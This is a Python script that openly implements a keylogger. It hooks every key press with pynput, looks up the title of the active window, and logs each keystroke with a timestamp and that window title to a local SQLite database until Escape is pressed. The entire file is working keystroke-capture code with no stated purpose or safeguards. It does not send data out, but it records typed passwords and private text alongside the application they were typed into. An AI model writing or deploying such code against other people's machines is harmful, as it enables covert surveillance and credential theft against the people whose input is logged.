import sqlite3
import time
import pygetwindow as gw
from pynput import keyboard

def initialize_database():
    conn = sqlite3.connect('keylogger.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            source TEXT
        )
    ''')
    conn.commit()
    conn.close()

def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        if window:
            return window.title
        else:
            return "Unknown"
    except Exception:
        return "Unknown"

class Keylogger:
    def __init__(self):
        self.db_name = 'keylogger.db'
        self.stop_listener = False

    def save_to_db(self, key):
        source = get_active_window_title()
        conn = sqlite3.connect(self.db_name)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO keystrokes (key, source) VALUES (?, ?)', (key, source))
        conn.commit()
        conn.close()

    def on_press(self, key):
        if self.stop_listener:
            return False

        try:
            key_char = key.char
            if key_char:
                self.save_to_db(key_char)
        except AttributeError:
            key_name = str(key)
            if key_name == 'Key.esc':
                self.stop_listener = True
                return False
            self.save_to_db(key_name)

    def on_exit(self):
        pass

if __name__ == "__main__":
    initialize_database()

    keylogger = Keylogger()
    try:
        with keyboard.Listener(on_press=keylogger.on_press) as listener:
            while not keylogger.stop_listener:
                time.sleep(1)
    finally:
        keylogger.on_exit()
